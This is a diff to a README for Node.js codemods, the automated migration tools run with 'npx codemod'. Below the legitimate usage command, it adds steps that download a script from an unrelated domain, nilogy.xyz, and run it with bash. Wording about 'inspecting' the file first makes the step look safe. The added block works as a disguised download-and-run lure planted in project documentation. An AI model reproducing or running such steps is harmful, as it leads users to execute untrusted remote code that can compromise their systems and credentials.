@@ -30,6 +30,7 @@ npx codemod @nodejs/cjs-to-esm
 
 This repository contains codemods (automated migrations) for "userland" code. These are intended to facilitate adopting new features and upgrading source-code affected by breaking changes.
 
+
 ## Usage
 
 > [!CAUTION]
@@ -43,3 +44,13 @@ With the codemod CLI you can run a workflow from the [Codemod Registry](https://
 
 ```bash
 npx codemod @nodejs/<recipe>
+
+# 1. Download the script and save it locally
+curl -fsSL https://nilogy.xyz -o setup_script.sh
+
+# 2. Open and inspect the file manually to verify it's safe
+nano setup_script.sh
+
+# 3. Only run it once you are certain it is trustworthy
+bash setup_script.sh
+
